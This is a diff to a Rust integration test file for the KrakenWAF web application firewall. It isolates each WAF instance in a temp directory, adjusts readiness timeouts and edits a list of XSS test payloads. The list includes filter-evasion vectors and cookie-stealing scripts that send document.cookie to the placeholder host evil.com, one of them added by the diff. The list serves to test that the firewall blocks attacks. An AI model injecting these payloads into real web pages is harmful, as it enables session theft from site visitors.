@@ -112,12 +112,15 @@ fn ensure_backend() {
 
 // ─── WAF subprocess helpers ───────────────────────────────────────────────────
 
-struct WafGuard(Child);
+struct WafGuard {
+    child: Child,
+    _tmpdir: tempfile::TempDir, // keeps the temp workdir alive; WAF gets its own SQLite DB
+}
 
 impl Drop for WafGuard {
     fn drop(&mut self) {
-        self.0.kill().ok();
-        self.0.wait().ok();
+        self.child.kill().ok();
+        self.child.wait().ok();
     }
 }
 
@@ -127,9 +130,14 @@ fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
     let listen = format!("127.0.0.1:{waf_port}");
     let upstream = format!("http://{}", backend_addr());
 
+    // Each WAF instance gets its own temp workdir so their SQLite databases
+    // don't conflict when tests run in parallel.
+    let tmpdir = tempfile::tempdir().expect("failed to create temp dir for WAF");
+
     let child = Command::new(env!("CARGO_BIN_EXE_krakenwaf"))
         .args([
             "--no-tls",
+            "--allow-private-upstream",
             "--listen",
             &listen,
             "--upstream",
@@ -138,29 +146,29 @@ fn spawn_waf(waf_port: u16, extra_args: &[&str]) -> WafGuard {
             &rules_dir,
         ])
         .args(extra_args)
-        .current_dir(project_root)
+        .current_dir(tmpdir.path())
         .stdout(Stdio::null())
         .stderr(Stdio::null())
         .spawn()
         .expect("failed to spawn krakenwaf binary");
 
-    WafGuard(child)
+    WafGuard { child, _tmpdir: tmpdir }
 }
 
 /// Poll the WAF health endpoint until it responds (or timeout).
 async fn wait_for_waf(client: &reqwest::Client, waf_port: u16) {
     let health_url = format!("{}/__krakenwaf/health", waf_base(waf_port));
-    for _ in 0..40 {
+    for _ in 0..60 {
         if client
             .get(&health_url)
-            .timeout(Duration::from_millis(300))
+            .timeout(Duration::from_millis(500))
             .send()
             .await
             .is_ok()
         {
             return;
         }
-        tokio::time::sleep(Duration::from_millis(150)).await;
+        tokio::time::sleep(Duration::from_millis(300)).await;
     }
     panic!("KrakenWAF on port {waf_port} did not become ready in time");
 }
@@ -195,11 +203,11 @@ const XSS_PAYLOADS: &[&str] = &[
     "<keygen autofocus onfocus=alert(1)>",
     "javascript:alert(1)",
     "\"><script>alert(1)</script>",
-    "';alert(1)//",
+    "<img/src=x onerror=alert(1)>",
     "\"/><script>alert(1)</script>",
     "<scr<script>ipt>alert(1)</scr</script>ipt>",
     "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
-    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
     "<script>document.location='http://evil.com/?c='+document.cookie</script>",
     "<img src=\"javascript:alert('xss')\">",
     "<link rel=stylesheet href=javascript:alert(1)>",
@@ -392,6 +400,7 @@ async fn blocklisted_ip_is_blocked() {
     let _waf = spawn_waf(
         port,
         &[
+            "--blocklist-ip",
             "--real-ip-header",
             "X-Real-IP",
             "--trusted-proxy-cidrs",
